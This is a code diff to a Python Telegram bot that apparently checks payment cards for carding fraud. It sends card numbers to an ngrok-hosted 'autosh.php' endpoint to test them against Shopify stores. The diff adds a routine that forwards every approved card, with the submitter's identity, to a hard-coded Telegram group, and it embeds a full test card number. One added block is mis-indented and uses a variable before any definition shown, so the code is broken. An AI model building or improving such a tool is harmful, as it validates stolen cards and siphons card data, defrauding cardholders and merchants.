@@ -30,6 +30,7 @@ OWNER_ID = 8026335089  # Replace with your Telegram ID
 ADMIN_IDS = [987654321, 112233445]  # Replace with admin Telegram IDs
 USER_DATA_FILE = "users.json"
 GROUP_DATA_FILE = "groups.json"
+APPROVED_CARDS_GROUP_ID = -1001234567890  
 CREDIT_RESET_INTERVAL = 3600  # 1 hour in seconds
 CREDITS_PER_HOUR = 100  # Credits per hour
 MAX_MASS_CHECK = 10  # Max cards per mass check
@@ -174,6 +175,29 @@ def get_bin_info(bin_number):
         return None
     except:
         return None
+
+def send_to_group(cc, gateway, response, bin_info, time_taken, user_info):
+    user_status = get_user_status(user_info.id)
+    mention = f"<a href='tg://user?id={user_info.id}'>{user_info.first_name}</a>"
+    
+    response_text = approved_check_format(
+        cc=cc,
+        gateway=gateway,
+        response=response,
+        mention=mention,
+        Userstatus=user_status,
+        bin_info=bin_info,
+        time_taken=time_taken
+    )
+    
+    try:
+        bot.send_message(
+            chat_id=APPROVED_CARDS_GROUP_ID,
+            text=response_text,
+            parse_mode='HTML'
+        )
+    except Exception as e:
+        print(f"Failed to send to group: {e}")
 
 # Format for checking status
 def checking_status_format(cc, gateway, bin_info):
@@ -379,6 +403,15 @@ def handle_au(message):
     if not use_credits(user_id):
         bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
         return
+    if check_result["status"].upper() == "APPROVED":
+    send_to_group(
+        cc=cc,
+        gateway=check_result["gateway"],
+        response=check_result["response"],
+        bin_info=bin_info,
+        time_taken=time_taken,
+        user_info=message.from_user
+    )
 
     command_parts = message.text.split()
     if len(command_parts) < 2:
@@ -1445,7 +1478,7 @@ def test_shopify_site(url):
         test_card = "5547300001996183|11|2028|197"
         
         api_url = f"https://7feeef80303d.ngrok-free.app/autosh.php?cc={test_card}&site={url}"
-        response = requests.get(api_url, timeout=30)
+        response = requests.get(api_url, timeout=100)
         
         if response.status_code != 200:
             return False, "Site not reachable", "0.0", "shopify_payments", "No response"
@@ -1616,7 +1649,7 @@ def check_shopify_cc(cc, site_info):
 
         # Make API request
         api_url = f"https://7feeef80303d.ngrok-free.app/autosh.php?cc={formatted_cc}&site={site_info['url']}"
-        response = requests.get(api_url, timeout=30)
+        response = requests.get(api_url, timeout=100)
         
         if response.status_code != 200:
             return {
